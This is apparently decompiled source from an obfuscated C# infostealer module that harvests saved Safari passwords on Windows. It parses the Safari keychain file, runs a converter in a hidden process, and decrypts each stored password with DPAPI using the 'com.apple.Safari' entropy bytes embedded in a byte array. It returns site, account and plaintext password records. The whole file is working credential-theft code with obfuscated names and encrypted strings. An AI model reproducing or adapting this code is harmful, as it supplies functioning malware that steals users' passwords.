using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic.CompilerServices;

internal sealed class AQS
{
	private static byte[] ZG_120 = new byte[144]
	{
		29,
		172,
		168,
		248,
		211,
		184,
		72,
		62,
		72,
		125,
		62,
		10,
		98,
		7,
		221,
		38,
		230,
		103,
		129,
		3,
		231,
		178,
		19,
		165,
		176,
		121,
		238,
		79,
		15,
		65,
		21,
		237,
		123,
		20,
		140,
		229,
		75,
		70,
		13,
		193,
		142,
		254,
		214,
		231,
		39,
		117,
		6,
		139,
		73,
		0,
		220,
		15,
		48,
		160,
		158,
		253,
		9,
		133,
		241,
		200,
		170,
		117,
		193,
		8,
		5,
		121,
		1,
		226,
		151,
		216,
		175,
		128,
		56,
		96,
		11,
		113,
		14,
		104,
		83,
		119,
		47,
		15,
		97,
		246,
		29,
		142,
		143,
		92,
		178,
		61,
		33,
		116,
		64,
		75,
		181,
		6,
		110,
		171,
		122,
		189,
		139,
		169,
		126,
		50,
		143,
		110,
		6,
		36,
		217,
		41,
		164,
		165,
		190,
		38,
		35,
		253,
		238,
		241,
		76,
		15,
		116,
		94,
		88,
		251,
		145,
		116,
		239,
		145,
		99,
		111,
		109,
		46,
		97,
		112,
		112,
		108,
		101,
		46,
		83,
		97,
		102,
		97,
		114,
		105
	};

	internal static List<JK> LQ(string HSR_261)
	{
		//Discarded unreachable code: IL_0127, IL_013a
		//IL_0131: Expected O, but got I4
		string input = File.ReadAllText(HSR_261);
		List<JK> list = new List<JK>();
		JK jK = new JK();
		string input2 = Regex.Split(input, O.I("O1wVM6aY3lJdD0oprhFqQQ=="))[1];
		string[] o__ = Regex.Split(input2, O.I("FfgPdPmVCrdnaAyIzcHxTw=="));
		string[] array = default(string[]);
		object SF_ = array;
		object instance = MD(ref SF_, o__);
		array = (string[])SF_;
		int num = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(instance, null, "Length", new object[0], null, null, null), 1));
		int num2 = num;
		for (int i = 1; i <= num2; i = checked(i + 1))
		{
			jK.ECS_112 = YA(array[i], "<string>", "</string>", 0);
			jK.WE_114 = YA(array[i], "<string>", "</string>", 5);
			jK.GA_113 = KN(Convert.FromBase64String(YA(array[i], "<data>", "</data>", 0)));
			jK.NP_115 = "Safari Browser";
			list.Add(jK);
		}
		return list;
	}

	private static string KN(byte[] SCY_262)
	{
		byte[] array = ProtectedData.Unprotect(SCY_262, ZG_120, DataProtectionScope.CurrentUser);
		return Encoding.UTF8.GetString(array, 4, checked(array.Length - 4));
	}

	internal static bool EE_(string VOJ_263, string FR_264, ref string UXJ_265)
	{
		UXJ_265 = null;
		if (!File.Exists(VOJ_263))
		{
			return false;
		}
		Process process = new Process();
		process.StartInfo.FileName = VOJ_263;
		ProcessStartInfo startInfo = process.StartInfo;
		string left = Convert.ToString(" -convert xml1 -s -o \"");
		object SF_ = UXJ_265;
		object right = MD(ref SF_, Path.GetTempPath() + "\\fixed_keychain.xml\"");
		UXJ_265 = Conversions.ToString(SF_);
		startInfo.Arguments = Convert.ToString(Operators.AddObject(Operators.ConcatenateObject(left, right), "\"")) + FR_264 + "\"";
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.UseShellExecute = false;
		process.Start();
		process.WaitForExit();
		return process.StandardOutput.ReadToEnd().Length == 0;
	}

	private static string YA(string AI_266, string DJT_267, string LL_268, int RUR_269)
	{
		string input = Regex.Split(AI_266, DJT_267)[checked(RUR_269 + 1)];
		return Regex.Split(input, LL_268)[0];
	}

	private static object MD(ref object SF_270, object O__271)
	{
		SF_270 = RuntimeHelpers.GetObjectValue(O__271);
		return O__271;
	}
}
